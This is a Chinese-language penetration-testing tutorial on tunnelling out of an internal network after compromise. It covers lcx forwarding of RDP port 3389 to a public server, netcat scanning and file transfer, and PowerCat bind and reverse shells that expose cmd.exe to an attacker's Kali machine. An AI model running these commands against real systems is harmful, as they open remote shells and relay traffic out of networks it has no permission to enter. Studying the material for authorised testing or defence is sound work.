# 传输层隧道技术

概述：  
传输层包括TCP隧道，UDP隧道和常规端口转发，内网防火墙阻止了对指定端口的访问，获取目标机器的权限后可以使用IPTABLES打开指定端口。

这里使用子域控制器与云服务器来进行演示：

> Icx端口转发
>
> netcat
>
> PowerCat

# 一、lcx

是一个基于SOCKET套接字实现的端口转发工具：

### a.内网端口转发

(1)在目标机器上执行，将3389端口所有的数据都转发到公网的4444端口:

    
    
    Lcx.exe -slave 82.156.12.125  4444 127.0.0.1 3389
    

![image](https://image.3001.net/images/20210916/1631777346_6142f242b2ff9decfa77a.png!small)（2）云服务器上执行

    
    
    lcx.exe -listen 4444 5555
    

![image](https://image.3001.net/images/20210916/1631777370_6142f25a6e97c9a3a8aec.png!small)

### b.本地端口映射

    
    
    lcx -tran 53目标主机ip 3389
    

也可以在本地主机登录云服务器用 云服务器的IP:5555  
通过这个 我们就可以访问他所有的流量

# 二、netcat

(1)简单bunner抓取：

    
    
    nc64.exe -nv 192.168.43.157 22
    

(2)端口扫描：

    
    
    nc64.exe -v 192.168.43.157 22
    

(3)多个端口扫描：

    
    
    nv64.exe -v -z 192.168.43.157 11-25
    

(4)监听：

    
    
    nv64.exe  -l -p 192.168.43.157 8888
    

### 文件传输

(1)子域控制器上执行：

    
    
    nc.exe -vn 10.10.88.22 7777 < ice.txt
    

![image](https://image.3001.net/images/20210916/1631777413_6142f2854d1810838e23d.png!small)(2)子域用户上执行：

    
    
    nc64.exe -lp 7777 > ice.txt
    

这样ice.txt就传到了主域用户桌面

### 使用nc聊天

(1)子域控制器上执行：

    
    
    nc.exe -vn 10.10.88.22 7777
    

(2)子域用户执行：

    
    
    nc.exe -l -p 7777
    

![image](https://image.3001.net/images/20210916/1631777433_6142f29908319529be147.png!small)

# 三、PowerCat

由于PowerCat是NetCat的PowerShell形式，所以，PowerCat可以无缝的和Netcat连接。PowerCat的用法和Netcat大概一模一样。  
下载地址为：

    
    
    git clone https://github.com/besimorhino/powercat.git
    

(1)进入powershell  
(2)Set-ExecutionPolicy remotesigned修改RemoteSigned 注意：以管理员运行cmd  
(3)Import-Module .\powercat.ps1  
![image](https://image.3001.net/images/20210916/1631777468_6142f2bce6dacc4a87fd6.png!small)

## 通过nc正向连接PowerCat

(1)被攻击机上执行：

    
    
    powercat -l -p 6666 -e cmd.exe -v
    

![image](https://image.3001.net/images/20210916/1631777481_6142f2c988055d23d3a5f.png!small)  
(2)kali上执行

    
    
    netcat 192.168.12.125  6666 -vv
    

![image](https://image.3001.net/images/20210916/1631777495_6142f2d70648377f4e347.png!small)

## 通过nc反向连接PowerCat

(1)kali执行：

    
    
    netcat -l -p 8888 -vv
    

![image](https://image.3001.net/images/20210916/1631777525_6142f2f53207fea75ba7a.png!small)(2)被攻击机上执行：

    
    
    powercat -c 192.168.43.87 -p 8888 -v -e cmd.exe
    

![image](https://image.3001.net/images/20210916/1631777537_6142f30131ce061f84377.png!small)

